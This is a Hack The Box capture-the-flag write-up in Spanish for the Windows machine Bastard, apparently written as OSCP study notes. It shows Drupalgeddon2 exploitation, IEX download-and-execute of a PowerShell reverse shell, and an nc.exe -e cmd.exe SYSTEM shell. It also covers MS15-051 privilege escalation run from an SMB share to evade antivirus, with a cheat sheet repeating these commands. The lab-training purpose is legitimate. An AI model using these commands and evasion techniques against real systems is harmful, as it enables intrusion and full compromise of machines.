[👹 Bastard — HTB [Windows · Medium] 33215bd2d16c80e7b735f6194e2c30ee.md](https://github.com/user-attachments/files/28266070/Bastard.HTB.Windows.Medium.33215bd2d16c80e7b735f6194e2c30ee.md)
# 👹 Bastard — HTB [Windows · Medium]

> **Plataforma:** Hack The Box | **OS:** Windows Server 2008 R2 x64 | **Dificultad:** Medium | **CVEs:** CVE-2018-7600 (Drupalgeddon2 RCE) + MS15-051 (Kernel PrivEsc)
> 

| Campo | Detalle |
| --- | --- |
| IP | `10.10.10.9` |
| Foothold | Drupal 7 — Drupalgeddon2 RCE (CVE-2018-7600) |
| Acceso inicial | Shell como **iusr** (IIS Application Pool) |
| PrivEsc | MS15-051 x64 — ejecutado vía SMB sin tocar disco |
| Acceso final | **NT AUTHORITY\SYSTEM** |
| AV presente | Sí — bloqueaba escritura de .exe en disco |
| Método de bypass AV | Ejecución remota por UNC path (\\IP\share\exploit.exe) |

---

# 1. Reconocimiento

## Nmap

```bash
nmap -sV -sC -p- --min-rate 5000 -oN bastard_full.nmap 10.10.10.9
```

```
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Bastard | Bastard
135/tcp   open  msrpc
49154/tcp open  msrpc
```

**Dato clave:** IIS 7.5 sirviendo **Drupal 7**. La versión se puede confirmar en `/CHANGELOG.txt` o `/README.txt` — rutas que Drupal expone por defecto y que revelan la versión exacta sin autenticación.

```bash
curl http://10.10.10.9/CHANGELOG.txt | head -5
# → Drupal 7.54, 2017-02-01
```

---

# 2. Foothold — Drupalgeddon2 (CVE-2018-7600)

## ¿Qué es la vulnerabilidad?

**CVE-2018-7600** (Drupalgeddon2) es una vulnerabilidad crítica de RCE en Drupal 6, 7 y 8. El fallo está en el sistema de Forms API de Drupal, que no sanitiza correctamente ciertos parámetros de entrada antes de procesarlos. Un atacante puede inyectar código PHP arbitrario a través de una petición HTTP especialmente manipulada, sin necesitar autenticación.

En Drupal 7, el vector principal es el endpoint `/user/register` con el parámetro `#post_render`.

## Error crítico — Comillas curvas vs rectas

Antes de ejecutar cualquier exploit de Ruby o Python copiado de un blog o repositorio, verificar siempre las comillas. Los editores web convierten `"` (recta) en `“”` (curva/tipográfica). Ruby y Python no reconocen las comillas curvas y el script falla con:

```
URI must be ASCII only
```

**Regla de oro:** nunca copiar comandos directamente del navegador a la terminal. Pegar primero en un editor de texto plano (nano, mousepad, notepad) para normalizar las comillas, o escribir el comando manualmente.

## Ejecución del exploit

```bash
searchsploit drupal 7
# → 44449.rb — Drupal < 7.58 - 'Drupalgeddon2' Remote Code Execution
searchsploit -m 44449.rb

# Ejecutar
ruby 44449.rb http://10.10.10.9
```

## Shell estabilizada

La webshell de Drupalgeddon2 es inestable para comandos complejos. Subir una reverse shell PowerShell:

```bash
# Preparar shell.ps1 con Invoke-PowerShellTcp al final
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -O shell.ps1
echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.X -Port 4444" >> shell.ps1

# Servidor HTTP
sudo python3 -m http.server 80

# Listener
nc -lvnp 4444
```

Desde la webshell de Drupalgeddon2:

```
> powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.X/shell.ps1')
```

## Shell recibida

```
PS C:\inetpub\drupal-7.54> whoami
nt authority\iusr
```

---

# 3. Enumeración Post-Foothold

## OS y arquitectura

```powershell
systeminfo
```

```
OS Name:       Microsoft Windows Server 2008 R2 Datacenter
OS Version:    6.1.7600 N/A Build 7600
System Type:   x64-based PC
```

Windows Server 2008 R2 x64, Build 7600 — sin parches. Candidato a múltiples kernel exploits.

## Verificar arquitectura del proceso actual

```powershell
[System.Environment]::Is64BitProcess
# → False  ← proceso WOW64 (32 bits)
[System.Environment]::Is64BitOperatingSystem
# → True   ← OS 64 bits
```

**Importante:** La shell corre en un proceso de 32 bits (WOW64) aunque el OS sea x64. Los exploits de 64 bits fallarán desde este contexto a menos que se lancen desde un proceso nativo de 64 bits.

## Ejecutar Sherlock para identificar PrivEsc

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.X/Sherlock.ps1')
```

**Resultado:** MS15-051 y MS16-032 marcados como `Appears Vulnerable`.

## Privilegios

```bash
whoami /priv
```

SeImpersonatePrivilege también habilitado — JuicyPotato sería viable como alternativa.

---

# 4. El Obstáculo — Antivirus Activo

Este es el punto diferenciador de Bastard respecto a las otras máquinas. Hay un **AV activo** que monitoriza la escritura de ejecutables en disco.

**Comportamiento del AV:**

- Al intentar bajar cualquier `.exe` con certutil o PowerShell `IWR`, el archivo llega con **0 bytes** o desaparece después de descargarse.
- El AV intercepta el flujo de red o el evento de creación del archivo y lo elimina antes de que puedas ejecutarlo.

**La señal de que el AV está actuando:**

```bash
certutil.exe -urlcache -f http://10.10.14.X/ms15-051x64.exe exploit.exe
certutil: -URLCache command completed successfully.
# Pero:
dir exploit.exe
# → 0 bytes  o  File Not Found
```

Si el archivo llega con 0 bytes después de varios intentos: **deja de intentarlo en disco. El AV lo está matando.**

---

# 5. Escalada de Privilegios — MS15-051 x64 via SMB

## Intentos fallidos documentados

### Intento 1 — Taihou64.exe desde proceso WOW64

```
Taihou64.exe
# → "This version of ... is not compatible with the version of Windows you're running"
```

**Causa:** Se intentó ejecutar un binario de 64 bits desde una shell que operaba en modo WOW64 (proceso de 32 bits). Windows rechaza los binarios de 64 bits en ese contexto.

**Lección:** Si el OS es x64 pero el proceso es x86 (WOW64), hay dos opciones: lanzar el exploit desde `C:\Windows\SysNative\` para forzar 64 bits, o usar directamente la ejecución remota por SMB.

---

### Intento 2 — Renombrado .exe → .txt para evadir AV

```bash
certutil.exe -urlcache -f http://10.10.14.X/ms15-051x64.exe ms.txt
# → ÉXITO: archivo bajó con 335 KB intactos
```

El AV no analiza `.txt` con la misma rigurosidad. El archivo llegó íntegro.

```powershell
Rename-Item -Path "C:\inetpub\drupal-7.54\ms.txt" -NewName "t64.exe"
```

En cuanto el archivo recuperó la extensión `.exe`, el AV lo borró antes de poder ejecutarlo.

---

### Intento 3 — Renombrado + ejecución instantánea (race condition)

```bash
cmd /c "rename ms.txt m64.exe && m64.exe whoami > ok.txt"
```

**Lógica:** Renombrar y ejecutar en el mismo comando con `&&` para que no haya margen temporal para el AV.

**Resultado:** El AV era demasiado rápido. En algunos intentos el archivo se borraba antes de ejecutarse, en otros el output llegaba pero la sesión era inestable.

---

### Solución Final — Ejecución directa por SMB (sin tocar disco)

**Este es el método que definitivamente funcionó y la técnica más importante de toda la máquina.**

```bash
# En Kali — compartir la carpeta con los exploits
impacket-smbserver shared . -smb2support
```

```bash
:: En la shell de iusr — ejecutar directamente desde la ruta UNC
\\10.10.14.X\shared\ms15-051x64.exe "whoami"
```

**Por qué funciona:**

Cuando ejecutas `\\IP\share\archivo.exe`, Windows carga los bytes del ejecutable **directamente en RAM desde el tráfico de red SMB**. El archivo **nunca se crea físicamente en el disco duro** de la víctima. El AV monitoriza eventos del sistema de archivos (creación, escritura de archivos) — si el archivo nunca existe en disco, no hay evento que disparar. El AV nunca llega a ver el binario.

## Obtener shell de SYSTEM

```bash
# Listener
nc -lvnp 5555
```

```bash
:: Ejecutar exploit y lanzar shell reversa directamente desde SMB
\\10.10.14.X\shared\ms15-051x64.exe "\\10.10.14.X\shared\nc.exe -e cmd.exe 10.10.14.X 5555"
```

## Shell SYSTEM recibida

```
connect to [10.10.14.X] from (UNKNOWN) [10.10.10.9]
Microsoft Windows [Version 6.1.7600]

C:\Windows\system32> whoami
nt authority\system
```

---

# 6. Historial de Errores — Lo Que Falló y Por Qué

| # | Problema | Error | Causa raíz |
| --- | --- | --- | --- |
| 1 | Comillas curvas en el exploit | `URI must be ASCII only` | Copiar del navegador convierte `"` en `“”` → siempre usar editor de texto plano |
| 2 | Descargar .exe directamente | 0 bytes / archivo desaparece | AV intercepta escritura en disco → cambiar de método inmediatamente |
| 3 | Taihou64.exe desde WOW64 | `not compatible with this version` | Binario x64 desde proceso x86 → verificar Is64BitProcess antes de ejecutar |
| 4 | Rename .txt → .exe + ejecutar | AV borra el archivo | AV reacciona a la extensión → race condition insuficiente |
| 5 | 20+ intentos de certutil | Siempre 0 bytes | Persistencia ciega en el método equivocado → pivotar a SMB después de 2-3 fallos |
| ✅ | SMB UNC path execution | **SYSTEM shell** | Binario nunca toca el disco → AV no detecta ningún evento |

---

# 7. Rutas Alternativas de PrivEsc

Si MS15-051 hubiera fallado, estas alternativas están disponibles en Bastard:

| Método | Por qué funcionaría |
| --- | --- |
| **MS16-032** ([Invoke-MS16032.ps](http://Invoke-MS16032.ps)1) | Cargado en memoria vía IEX, sin tocar disco → AV no lo ve |
| **JuicyPotato** | iusr tiene SeImpersonatePrivilege en Server 2008 |
| **MS11-046** | Clásico para Win7/2008 R2, muy estable si la arquitectura es correcta |

Para JuicyPotato también se ejecutaría vía SMB:

```bash
\\10.10.14.X\shared\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c ..." -t *
```

---

# 8. Moralejas y Notas para el OSCP

## Moraleja 1 — El disco es lava cuando hay AV: SMB como bypass estándar

Esta es la lección más importante de Bastard y directamente aplicable al OSCP. Cuando un archivo llega con 0 bytes o desaparece después de descargarse, el AV está actuando. La respuesta no es insistir — es cambiar de método.

La ejecución via UNC path (`\\IP\share\exploit.exe`) carga el binario directamente en RAM desde la red. Sin evento de escritura en disco, sin detección del AV. Este es el bypass más limpio y universal disponible en Windows.

```bash
:: Patrón maestro de ejecución en presencia de AV
impacket-smbserver shared . -smb2support  ← en Kali
\\TU_IP\shared\exploit.exe [argumentos]   ← en víctima
```

---

## Moraleja 2 — 2-3 intentos fallidos = cambiar de método, no insistir

La persistencia es una virtud en pentesting, pero aplicada al método equivocado es una trampa. Si certutil falla 3 veces con 0 bytes, el archivo no va a bajar bien a la cuarta vez. En el OSCP el tiempo es crítico — la regla es:

- 1er fallo → verificar el comando
- 2do fallo → verificar el método
- 3er fallo → cambiar de método completamente

---

## Moraleja 3 — Verificar Is64BitProcess antes de ejecutar cualquier exploit x64

Bastard es x64 pero la shell inicial corre en WOW64 (proceso x86). Ejecutar un binario de 64 bits desde WOW64 da el error `not compatible with this version` que parece un problema del exploit cuando en realidad es un problema de contexto.

```powershell
# Siempre verificar antes de ejecutar exploits de kernel
[System.Environment]::Is64BitProcess        # ¿mi proceso es 64 bits?
[System.Environment]::Is64BitOperatingSystem # ¿el OS es 64 bits?
```

Si `Is64BitProcess = False` y `Is64BitOperatingSystem = True`, lanzar el exploit desde SysNative:

```bash
C:\Windows\SysNative\cmd.exe /c \\IP\shared\exploit_x64.exe
```

---

## Moraleja 4 — Las comillas del navegador rompen los exploits

Copiar comandos de blogs, writeups o repositorios web introduce comillas tipográficas (`“”`) que los intérpretes (Ruby, Python, bash) no reconocen. El error `URI must be ASCII only` en el exploit de Drupalgeddon2 fue exactamente este problema.

**Regla fija:** Todo comando copiado de internet pasa primero por nano o mousepad antes de ejecutarse. O mejor, escribirlo manualmente.

---

## Moraleja 5 — IEX en memoria es el bypass de AV para scripts PowerShell

Mientras que los ejecutables `.exe` necesitan SMB para evitar el disco, los scripts `.ps1` tienen un bypass nativo: `IEX` carga el script directo en memoria sin crear ningún archivo.

```powershell
# AV nunca ve este script en disco
IEX(New-Object Net.WebClient).DownloadString('http://TU_IP/Invoke-MS16032.ps1')
```

Combinando IEX para scripts y SMB para binarios, puedes operar en un entorno con AV sin tocar el disco en ningún momento.

---

## Moraleja 6 — El patrón completo de Bastard

```
nmap → IIS 7.5 + Drupal 7
    ↓
/CHANGELOG.txt → versión exacta Drupal 7.54
    ↓
Drupalgeddon2 (44449.rb) → normalizar comillas primero
    ↓
IEX shell.ps1 → shell como iusr
    ↓
IEX Sherlock.ps1 → MS15-051 vulnerable
    ↓
AV activo → certutil da 0 bytes → pivotar a SMB
    ↓
impacket-smbserver → \\IP\shared\ms15-051x64.exe
    ↓
NT AUTHORITY\SYSTEM
```

---

# 9. Comandos Clave — Cheat Sheet

```bash
# Identificar versión Drupal
curl http://10.10.10.9/CHANGELOG.txt | head

# Exploit Drupalgeddon2 (normalizar comillas antes)
ruby 44449.rb http://10.10.10.9

# Shell PS via IEX
nc -lvnp 4444
powershell IEX(New-Object Net.WebClient).DownloadString('http://TU_IP/shell.ps1')

# Verificar arquitectura
[System.Environment]::Is64BitProcess
[System.Environment]::Is64BitOperatingSystem

# Sherlock en memoria
IEX(New-Object Net.WebClient).DownloadString('http://TU_IP/Sherlock.ps1')

# SMB para evadir AV (en Kali)
impacket-smbserver shared . -smb2support

# Ejecutar exploit SIN tocar disco (en víctima)
\\TU_IP\shared\ms15-051x64.exe "whoami"
\\TU_IP\shared\ms15-051x64.exe "\\TU_IP\shared\nc.exe -e cmd.exe TU_IP 5555"

# Flags
type C:\Users\dimitris\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

---

# 10. Flags

flag user.txt

![flags](https://github.com/2eevi/htb-writeups/blob/main/Bastard/assets/image.png)

,

root.txt 

![flags](https://github.com/2eevi/htb-writeups/blob/main/Bastard/assets/image1.png)
